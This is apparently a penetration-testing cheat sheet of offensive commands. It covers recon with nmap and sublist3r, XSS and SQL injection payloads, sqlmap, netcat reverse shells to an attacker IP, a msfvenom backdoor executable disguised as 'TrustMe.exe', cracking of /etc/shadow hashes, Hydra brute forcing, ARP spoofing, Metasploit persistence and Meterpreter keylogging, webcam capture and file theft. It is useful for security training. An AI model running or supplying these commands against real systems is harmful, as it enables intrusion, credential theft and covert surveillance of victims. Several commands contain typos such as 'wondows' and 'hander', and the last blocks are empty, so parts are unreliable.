# Information Gathering

### whois

```
whois <target>
```

### sublist3r

[Sublist3r kalitools](https://tools.kali.org/information-gathering/sublist3r)

```
sublist3r -v -d <target> -b
```
- -v: verbose
- -d: domain name
- -b: brute force

# Footprinting & Scanning

### NMAP

[Nmap kalitools](https://tools.kali.org/information-gathering/nmap)

```
nmap -sT -O <ip>
```
- -sT: TCP connect scan (full TCP handshake)
- -O: OS

```
nmap -sS -sV -p 22,80,443,445 <ip>
```
- -sS: SYN scan (silent scan)
- -sV: show version
- -p: port

# Vulnerabity Scanning

### Nessus

[Nessus Register Page](https://www.tenable.com/products/nessus/nessus-essentials)

1. Create Profile
2. Select Target IP
3. Scan

# Web Attacks

### HTTP Response Status Codes

| Code | Meaning |
| ---- | ------- |
| 200  |  OK |
| 301  |  Moved Permanently |
| 302  |  Moved Temporarily  |
| 400  |  Bad Request |
| 401  |  Unauthorized |
| 403  |  Forbidden |
| 404  |  Not Found |
| 500  |  Internal Server Issue |
| 503  |  Service Unavailable |

&nbsp;

### HTTP Request Methods

&nbsp;

> GET : request resource
```
GET / HTTP/1.1
Host: <target>
```

> POST : submit HTML form
```
POST /login.php HTTP/1.1
Host: <target>

username=john&password=mypass
```

> HEAD : ask headers
```
HEAD / HTTP/1.1
Host: <target>
```

> PUT : upload a file
```
PUT /path/to/destination HTTP/1.1
Host: <target>
Content-type: text/html
Content-lenth: XX

<?php
    <payload>
?>
```

> DELETE : remove a file
```
DELETE /path/to/destination HTTP/1.1
Host: <target>
```

### nc

```
nc <target> 80
OPTIONS / HTTP/1.0
```

### Google Dorks

[Google Hacking Database](https://www.exploit-db.com/google-hacking-database)

| Syntax     | Meaning |
| ---------- | ------- |
| site:      | include only given hostname |
| intitle:   | filters according to title of page |
| inurl:     | filters according to URL |
| filetype:  | filters according to file extension |
| AND, OR, & |  logical operators |
| -          | filter out a keyword or a command result |

```
inurl: admin intitle: login
```

### Cross Site Scripting (XSS)

```
<h1>Hi</h1>
```

```
<script>alert('XSS');</script>
```

```
<script>alert(document.cookie);</script>
```

### SQL Injection

```
' or 1=1; -- -
```

```
' UNION SELECT 'els1','els2','els3'; -- -
```

### sqlmap

[sqlmap kalitools](https://tools.kali.org/vulnerability-analysis/sqlmap)

```
sqlmap -u '<target?parameter=1>' -p <parameter> --technique=B
```
- -u : link
- -p : parameter
- --technique= : technique used
- - B : Bolean
- - U : UNION 
- --users : grab users
- --dbs : show all db
- -D : select db
- --tables : show all table
- -T : select table
- --columns : show all column
- -C : select column

# System Attacks

## Backdoor

### nc

[nc manpage](https://manpages.debian.org/stretch/netcat-traditional/nc.1.en.html)

Server (reverse connect)
```
nc -lvp <port> 
```
- -l : listen mode
- -p : port
- -v : verbose

Client (reverse cmd)
```
nc -e cmd <ip> <port>
```
- -e : execute

Client (reverse shell)
```
nc -e /bin/bash <ip> <port>
```
- -e : execute

### Metasploit / Meterpreter

[Metasploit Framework kalitools](https://tools.kali.org/exploitation-tools/metasploit-framework)

Make Backdoor

```
msfvenom -p wondows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f exe -o /tmp/TrustMe.exe
```

Make Listener

```
use exploit/multi/hander
```

```
set payload windows/meterpreter/reverse_tcp
```

```
set lport <port>
```

```
exploit
```

## Password Cracking 

### hashid

[hashid manpage](https://www.mankier.com/7/hashid)

```
hashid -m -j 'hash'
```
- -m : hashcat mode
- -j : johntheripper mode

### John the Ripper

[John the Reaper kalitools](https://tools.kali.org/password-attacks/john)

```
unshadow /etc/passwd /etc/shadow > hashes
```

```
john -wordlist=/path/to/rockyou.txt hashes
```

```
john --show hashes
```

### Hashcat

[Hascat kalitools](https://tools.kali.org/password-attacks/hashcat)

```
hashcat -m 0 -a 0 -o cracked.txt target.txt /path/to/rockyou.txt
```
- -m : mode
- -a : attack type
- -o : output

# Network Attacks

### Hydra

[THC-Hydra kalitools](https://tools.kali.org/password-attacks/hydra)

```
hydra ssh://<ip> -l root -P path/to/rockyou.txt
```

or 

```
hydra <target> <service> -L path/to/username_wordlist.usr -P path/to/rockyou.txt -V
```
- -l : username
- -L : username word list
- -p : password
- -P : password word list
- -V : verbose

```
hydra <target> http-post-form “<Login Page>:<Request Body>:<Error Message>” -L path/to/username_wordlist.usr -P path/to/rockyou.txt
```

### enum4linux

[enum4linux kalitools](https://tools.kali.org/information-gathering/enum4linux)

```
enum4linux -U -o 192.168.1.200
```
- -U : userlist
- -o : os information

### nmap

```
nmap -script=smb-enum-shares <ip>
```

```
nmap -script=smb-enum-users <ip>
```

```
nmap -script=smb-brute <ip>
```

### ARP Poisoning

```
echo 1 > /proc/sys/net/ipv4/ip_forward
```
- enable ip forwarding

```
arpspoof -i <interface> -t <target> -r <host>
```
- -i : interface
- -t : target
- -r : host 

### Metasploit

```
search <module>
```

```
use <module>
```

```
show options
```

```
use exploit/windows/local/s4u_persistence
```

```
set payload windows/meterpreter/reverse_tcp
```

```
set lhost <ip>
```

```
set lport <port>
```

```
exploit
```

### Meterpreter

Go back to Metasploit
```
background
```

Enter Shell
```
shell
```

Execute commands
```
execute -f cmd.exe -i -H
```

Start keylogger
```
keyscan_start
```

Webcam snap
```
webcam_snap
```

Download file
```
download <file> <loc>
```

Upload file
```
upload <file> <loc>
```

Migrate to another pid
```

```

Dump password hash
```

```